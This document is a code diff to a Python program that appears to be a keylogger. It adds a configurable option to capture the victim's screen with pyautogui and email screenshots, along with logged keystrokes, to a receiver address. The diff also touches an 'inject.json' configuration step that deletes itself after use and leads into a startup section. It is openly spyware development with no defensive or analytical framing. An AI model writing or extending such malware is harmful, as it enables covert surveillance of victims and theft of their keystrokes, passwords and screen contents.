@@ -33,7 +33,7 @@ try:
             json.load(f)
 except:
         with open(f"{path}/config.json","w") as r:
-             new = {'sender_email': 'sender', 'receiver_email': 'receiver', 'sender_password': 'password', "mode": 'mode'}
+             new = {'sender_email': 'sender', 'receiver_email': 'receiver', 'sender_password': 'password', "mode": 'mode',"screenshot": True}
              json.dump(new,r)
 
 JsonPath = f"{path}/config.json"
@@ -46,7 +46,7 @@ def screenshot(sender_email,receiver_email,sender_password):
     msg['Subject'] = "SCREENSHOT"
 
     # Attach the text message
-    msg.attach(MIMEText("scren", 'plain'))
+    msg.attach(MIMEText("screen", 'plain'))
 
     screenshot = pyautogui.screenshot()
     screenshot.save("./SCREENSHOT.png")
@@ -94,7 +94,7 @@ def get_ip_address(mode):
         
 
 
-def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):                     
+def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):                     
   
  
  
@@ -178,7 +178,10 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):
             message = UNmessage.replace("'","")
             message = message.replace("_Apostro4phe_","'")
             email(message)
-            screenshot(senderEmail,receiverEmail,senderPassword)
+            if Jscreenshot == False:
+                pass
+            else:
+                screenshot(senderEmail,receiverEmail,senderPassword)
             emailBool = False
             keys = []
     def isMaillable():
@@ -227,9 +230,10 @@ except:
                 JsenderPassword = parsed["sender_password"]
                 JreceiverEmail = parsed["receiver_email"]
                 Jmode = parsed["mode"]
+                Jscreenshot = parsed["screenshot"]
                        
                            
-        START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
+        START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode, Jscreenshot)
 
     
     
@@ -241,13 +245,14 @@ with open(f"inject.json", "r") as Inject:
                     JsenderPassword = parsed["sender_password"]
                     JreceiverEmail = parsed["receiver_email"]
                     Jmode = parsed["mode"]
+                    Jscreenshot = parsed["screenshot"]
                     configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
                                             "receiver_email": JreceiverEmail,
-                                            "mode": Jmode, "Injector": True}
+                                            "mode": Jmode, "screenshot": Jscreenshot}
                                 
                     json.dump(configData,Config)   
 os.remove("inject.json")            
-START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
+START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode, Jscreenshot)
 
 
 #!# -----------------------------------STARTUP----------------------------------- #!#
